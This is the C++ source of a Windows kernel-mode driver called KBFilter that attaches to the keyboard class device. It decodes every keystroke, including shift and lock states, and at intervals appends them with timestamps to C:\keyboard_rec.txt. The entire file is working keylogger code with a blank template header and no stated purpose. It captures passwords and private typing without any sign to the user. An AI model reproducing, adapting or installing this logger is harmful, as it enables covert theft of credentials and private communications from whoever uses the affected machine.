///////////////////////////////////////////////////////////////////////////////
///
/// Copyright (c) 2011 - <company name here>
///
/// Original filename: KBFilter.cpp
/// Project          : KBFilter
/// Date of creation : 2011-03-17
/// Author(s)        : <author name(s)>
///
/// Purpose          : <description>
///
/// Revisions:
///  0000 [2011-03-17] Initial revision.
///
///////////////////////////////////////////////////////////////////////////////

// $Id$

#ifdef __cplusplus
extern "C" {
#endif
#define NTSTRSAFE_LIB
#include <ntddk.h>
#include <string.h>
#include <ntddkbd.h>
#include <ntstrsafe.h>
#ifdef __cplusplus
}; // extern "C"
#endif

#include "KBFilter.h"

#ifdef __cplusplus
namespace { // anonymous namespace to limit the scope of this global variable!
#endif
PDRIVER_OBJECT pdoGlobalDrvObj = 0;
UNICODE_STRING deviceUnicodeString;
UNICODE_STRING symlinkUnicodeString;
UNICODE_STRING logPathUnicodeString;
KEVENT eventThread;
HANDLE hThread;
BOOLEAN quitThread;
PETHREAD pThread;
KEYBUFFER keyBuffer;
USHORT rows;
BOOLEAN numLock;
#ifdef __cplusplus
}; // anonymous namespace
#endif

unsigned char KeyTable[]={
	0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09, //normal
	0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x0D, 0x00, 0x61, 0x73,
	0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x7A, 0x78, 0x63, 0x76,
	0x62, 0x6E, 0x6D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09, //caps
	0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x5B, 0x5D, 0x0D, 0x00, 0x41, 0x53,
	0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x5A, 0x58, 0x43, 0x56,
	0x42, 0x4E, 0x4D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09, //shift
	0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x7B, 0x7D, 0x0D, 0x00, 0x41, 0x53,
	0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x5A, 0x58, 0x43, 0x56,
	0x42, 0x4E, 0x4D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09, //caps + shift
	0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x7B, 0x7D, 0x0D, 0x00, 0x61, 0x73,
	0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x7A, 0x78, 0x63, 0x76,
	0x62, 0x6E, 0x6D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E
};

VOID KBFILTER_CurrentTime(OUT PLARGE_INTEGER NowTime)
{	
	LARGE_INTEGER currentTime;
	KeQuerySystemTime(&currentTime);
	ExSystemTimeToLocalTime(&currentTime, NowTime);
}

BOOLEAN KBFILTER_WriteLog(IN PUCHAR Buffer, IN ULONG Length)
{
	if (Buffer == NULL)
		return FALSE;

	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE hFile;
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	FILE_STANDARD_INFORMATION fsi;
	FILE_POSITION_INFORMATION fpi;

	InitializeObjectAttributes(&objectAttributes, &logPathUnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS(status = ZwCreateFile(&hFile, GENERIC_WRITE, &objectAttributes, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)))
	{
		return FALSE;
	}

	if (!NT_SUCCESS(status = ZwQueryInformationFile(hFile, &ioStatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)))
	{
		ZwClose(hFile);
		return FALSE;
	}

	LARGE_INTEGER length = fsi.EndOfFile;
	LARGE_INTEGER now;
	TIME_FIELDS time;
	KBFILTER_CurrentTime(&now);
	RtlTimeToTimeFields(&now, &time);

	ULONG size = 30 + Length;
	if (size % 4 > 0)
		size += (4 - size % 4);

	CHAR* pool = (CHAR*)ExAllocatePool(NonPagedPool, size);
	RtlZeroMemory(pool, size);	
	RtlStringCbPrintfA(pool, size, "%04d-%02d-%02d %02d:%02d:%02d  ", time.Year, time.Month, time.Day, time.Hour, time.Minute, time.Second);
	
	size_t len;
	RtlStringCbLengthA(pool, size, &len);
	RtlCopyMemory(pool + len, Buffer, Length);
	RtlCopyMemory(pool + len + Length, "\r\n", 2);

	ULONG writelen = len + Length + 2;

	if (!NT_SUCCESS(status = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatus, pool, writelen, &length, NULL)))
	{		
		ZwClose(hFile);
		ExFreePool(pool);
		return FALSE;
	}

	ZwClose(hFile);
	ExFreePool(pool);

	return TRUE;
}

VOID KBFILTER_Thread(IN PVOID Context)
{
	KdPrint(("KBFILTER_Thread Start"));

	while (TRUE)
	{
		LARGE_INTEGER timeout;
		timeout.QuadPart = -10 * 15 * 1000 * 1000;

		NTSTATUS status = KeWaitForSingleObject(&eventThread, Executive, KernelMode, FALSE, &timeout);
		if (quitThread)
			break;

		if (status == STATUS_TIMEOUT)
		{
			ULONG len = 0;
			UCHAR* pool = NULL;

			KIRQL oldIrql;
			KeAcquireSpinLock(&keyBuffer.SpinLock, &oldIrql);			
			if (keyBuffer.Length > 0)
			{				
				len = keyBuffer.Length;
				pool = (UCHAR*)ExAllocatePool(NonPagedPool, len);
				RtlCopyMemory(pool, keyBuffer.Buffer, len);
				keyBuffer.Length = 0;
			}

			KeReleaseSpinLock(&keyBuffer.SpinLock, oldIrql);

			if (pool != NULL)
			{
				KBFILTER_WriteLog(pool, len);
				ExFreePool(pool);
				pool = NULL;
			}
		}
		else
			KeResetEvent(&eventThread);
	}

	ULONG len = 0;
	UCHAR* pool = NULL;

	KIRQL oldIrql;
	KeAcquireSpinLock(&keyBuffer.SpinLock, &oldIrql);			
	if (keyBuffer.Length > 0)
	{				
		len = keyBuffer.Length;
		pool = (UCHAR*)ExAllocatePool(NonPagedPool, len);
		RtlCopyMemory(pool, keyBuffer.Buffer, len);
		keyBuffer.Length = 0;
	}

	KeReleaseSpinLock(&keyBuffer.SpinLock, oldIrql);

	if (pool != NULL)
	{
		KBFILTER_WriteLog(pool, len);
		ExFreePool(pool);
		pool = NULL;
	}

	KdPrint(("KBFILTER_Thread End"));
	PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS KBFILTER_DispatchGeneral(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{	
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	KdPrint(("KBFILTER_DispatchGeneral 0x%02x", stack->MajorFunction));
	
	PDEVICE_EXTENSION			devExt;
	devExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	IoSkipCurrentIrpStackLocation(Irp);

	return IoCallDriver(devExt->TopOfStack, Irp);
}

NTSTATUS KBFILTER_ReadComplete(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	KdPrint(("KBFILTER_ReadComplete"));
	
	PDEVICE_EXTENSION			devExt;
	PKEYBOARD_INPUT_DATA		KeyData;
	int							numKeys, i;

	devExt = (PDEVICE_EXTENSION)((PDEVICE_OBJECT)Context)->DeviceExtension;

	if (NT_SUCCESS(Irp->IoStatus.Status) && !quitThread) 
	{
		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		numKeys = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		
		for (i = 0; i < numKeys; i++) 
		{
			if (KeyData[i].Flags)
			{
				switch (KeyData[i].MakeCode)
				{				
				case 0x2A:
				case 0x36:
					{
						if (rows >= 2)
							rows -= 2;
					}
					break;

				default:
					{
						if (!numLock)
						{
							//4F 50 51 4B 4C 4D 47 48 49, 52 53
							if (KeyData[i].MakeCode >= 0x47 && KeyData[i].MakeCode <= 0x49 || 
								KeyData[i].MakeCode >= 0x50 && KeyData[i].MakeCode <= 0x53 || 
								KeyData[i].MakeCode >= 0x4B && KeyData[i].MakeCode <= 0x4D || 
								KeyData[i].MakeCode == 0x4F)
								break;
						}

						UCHAR key = 0;
						switch (KeyData[i].MakeCode)
						{
						case 0x0E:
							key = 0x11;
							break;

						default:
							key = KeyTable[rows * 0x54 + KeyData[i].MakeCode];
							break;
						}
						
						KIRQL oldIrql;
						KeAcquireSpinLock(&keyBuffer.SpinLock, &oldIrql);
						if (keyBuffer.Length >= sizeof(keyBuffer.Buffer))
							keyBuffer.Length = 0;

						keyBuffer.Buffer[keyBuffer.Length++] = key;
						KeReleaseSpinLock(&keyBuffer.SpinLock, oldIrql);
					}					
					break;

				}								
			}
			else
			{
				switch (KeyData[i].MakeCode)
				{				
				case 0x2A:
				case 0x36:
					{
						if (rows < 2)
							rows += 2;
					}					
					break;
				}				
			}	
		}
	}
	
	if (Irp->PendingReturned) 
	{		
		IoMarkIrpPending(Irp);
	}

	return Irp->IoStatus.Status;
}

NTSTATUS KBFILTER_Read(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{	
	KdPrint(("KBFILTER_Read\n"));
	
	PDEVICE_EXTENSION devExt;
	
	devExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
	IoSkipCurrentIrpStackLocation(Irp);
	
	IoSetCompletionRoutine(Irp, KBFILTER_ReadComplete, DeviceObject, TRUE, TRUE, TRUE);
	
	NTSTATUS status = IoCallDriver(devExt->TopOfStack, Irp);
	devExt->Irp = Irp;

	if (status == STATUS_PENDING)
		devExt->Waitfor = TRUE;
	else
		devExt->Waitfor = FALSE;

	return status;
}

NTSTATUS KBFILTER_DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP	Irp)
{
	KdPrint(("KBFILTER_DispatchDeviceControl\n"));

	PDEVICE_EXTENSION devExt;
	devExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	PKEYBOARD_INDICATOR_PARAMETERS keyindicator = (PKEYBOARD_INDICATOR_PARAMETERS)Irp->AssociatedIrp.SystemBuffer;
	if (keyindicator->LedFlags & KEYBOARD_CAPS_LOCK_ON)
	{
		if (rows == 0 || rows == 2)
			rows++;
	}
	else
	{
		if (rows == 1 || rows == 3)
			rows--;
	}

	if (keyindicator->LedFlags & KEYBOARD_NUM_LOCK_ON)
		numLock = TRUE;
	else
		numLock = FALSE;

	IoSkipCurrentIrpStackLocation(Irp);
	
	return IoCallDriver(devExt->TopOfStack, Irp);
}

NTSTATUS KBFILTER_DriverPower(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	KdPrint(("KBFILTER_DriverPower\n"));

	PDEVICE_EXTENSION devExt;
	devExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	ULONG len = 0;
	UCHAR* pool = NULL;

	KIRQL oldIrql;
	KeAcquireSpinLock(&keyBuffer.SpinLock, &oldIrql);			
	if (keyBuffer.Length > 0)
	{				
		len = keyBuffer.Length;
		pool = (UCHAR*)ExAllocatePool(NonPagedPool, len);
		RtlCopyMemory(pool, keyBuffer.Buffer, len);
		keyBuffer.Length = 0;
	}

	KeReleaseSpinLock(&keyBuffer.SpinLock, oldIrql);

	if (pool != NULL)
	{
		KBFILTER_WriteLog(pool, len);
		ExFreePool(pool);
		pool = NULL;
	}

	PoStartNextPowerIrp(Irp);
	IoSkipCurrentIrpStackLocation(Irp);
	return PoCallDriver(devExt->TopOfStack, Irp);
}

VOID KBFILTER_DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	KdPrint(("KBFILTER_DriverUnload\n"));

    PDEVICE_OBJECT pdoNextDeviceObj = DriverObject->DeviceObject;
    IoDeleteSymbolicLink(&symlinkUnicodeString);

	quitThread = TRUE;
	KeSetEvent(&eventThread, IO_NO_INCREMENT, FALSE);
	KeWaitForSingleObject(pThread, Executive, KernelMode, FALSE, NULL);	
	ObDereferenceObject(pThread);
		
    while (pdoNextDeviceObj != NULL)
    {
        PDEVICE_OBJECT pdoThisDeviceObj = pdoNextDeviceObj;
        pdoNextDeviceObj = pdoThisDeviceObj->NextDevice;

		if (pdoThisDeviceObj->DeviceExtension != NULL)
		{
			PDEVICE_EXTENSION devExt = (PDEVICE_EXTENSION)pdoThisDeviceObj->DeviceExtension;						
			if (devExt->Waitfor)
				IoCancelIrp(devExt->Irp);

			IoDetachDevice(devExt->TopOfStack);
		}
		
        IoDeleteDevice(pdoThisDeviceObj);
    }	
	
	pdoGlobalDrvObj = NULL;
}

#ifdef __cplusplus
extern "C" {
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    PDEVICE_OBJECT pdoDeviceObj = NULL;
	PDEVICE_EXTENSION devExt = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;	
	UNICODE_STRING keyboardUnicodeString;
	ULONG i;

	RtlInitUnicodeString(&deviceUnicodeString, DEVICE_NAME);
	RtlInitUnicodeString(&symlinkUnicodeString, SYMLINK_NAME);
    RtlInitUnicodeString(&keyboardUnicodeString, L"\\Device\\KeyboardClass0");
	RtlInitUnicodeString(&logPathUnicodeString, L"\\??\\C:\\keyboard_rec.txt");

	if (!NT_SUCCESS(status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &deviceUnicodeString, FILE_DEVICE_KEYBOARD, 0, TRUE, &pdoDeviceObj)))
	{
		KdPrint(("IoCreateDevice Fail\n"));
		return status;
	}

	if (!NT_SUCCESS(status = IoCreateSymbolicLink(&symlinkUnicodeString, &deviceUnicodeString)))
	{
		KdPrint(("IoCreateSymbolicLink Fail\n"));
		IoDeleteDevice(pdoDeviceObj);
		return status;
	}

	RtlZeroMemory(pdoDeviceObj->DeviceExtension, sizeof(DEVICE_EXTENSION));

	devExt = (PDEVICE_EXTENSION)pdoDeviceObj->DeviceExtension;
	devExt->Waitfor = FALSE;
	pdoDeviceObj->Flags |= DO_BUFFERED_IO | DO_DIRECT_IO | DO_POWER_PAGABLE;
	pdoDeviceObj->Flags &= ~DO_DEVICE_INITIALIZING;

	if (!NT_SUCCESS(status = IoAttachDevice(pdoDeviceObj, &keyboardUnicodeString, &devExt->TopOfStack)))
	{
		KdPrint(("IoAttachDevice Fail\n"));
		IoDeleteDevice(pdoDeviceObj);
		return status;
	}

	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
	{
		DriverObject->MajorFunction[i] = KBFILTER_DispatchGeneral;
	}
   
	DriverObject->MajorFunction[IRP_MJ_READ] = KBFILTER_Read;
	DriverObject->MajorFunction[IRP_MJ_POWER] = KBFILTER_DriverPower;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KBFILTER_DispatchDeviceControl;
    DriverObject->DriverUnload = KBFILTER_DriverUnload;

	quitThread = FALSE;
	numLock = FALSE;
	rows = 0;

	KeInitializeEvent(&eventThread, NotificationEvent, FALSE);
	RtlZeroMemory(&keyBuffer, sizeof(KEYBUFFER));
	
	if (!NT_SUCCESS(status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, KBFILTER_Thread, NULL)))
	{
		KdPrint(("PsCreateSystemThread Fail\n"));
		IoDeleteDevice(pdoDeviceObj);
		return status;
	}	
	
	if (!NT_SUCCESS(status = ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID *)&pThread, NULL)))
	{
		KdPrint(("ObReferenceObjectByHandle Fail\n"));
		IoDeleteDevice(pdoDeviceObj);
		return status;
	}
		
	ZwClose(hThread);	
	KdPrint(("DriverEntry Success\n"));
	
	pdoGlobalDrvObj = DriverObject;

	KEVENT eventSync;
	IO_STATUS_BLOCK ioStatus;
	KeInitializeEvent(&eventSync, NotificationEvent, FALSE);

	KEYBOARD_INDICATOR_PARAMETERS keyindicator = {0};
	PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS, devExt->TopOfStack, NULL, 0, &keyindicator, sizeof(KEYBOARD_INDICATOR_PARAMETERS), TRUE, &eventSync, &ioStatus);
	if (irp != NULL)
	{
		status = IoCallDriver(devExt->TopOfStack, irp);
		if (status == STATUS_PENDING)			
			KeWaitForSingleObject(&eventSync, Suspended, KernelMode, FALSE,NULL);

		status = irp->IoStatus.Status;

		if (status == STATUS_SUCCESS)
		{
			if (keyindicator.LedFlags & KEYBOARD_CAPS_LOCK_ON)					
				rows++;
			
			if (keyindicator.LedFlags & KEYBOARD_NUM_LOCK_ON) // 4F 50 51 4B 4C 4D 47 48 49, 52 53
				numLock = TRUE;
		}	
	}	
		
    return STATUS_SUCCESS;
}

#ifdef __cplusplus
}; // extern "C"
#endif
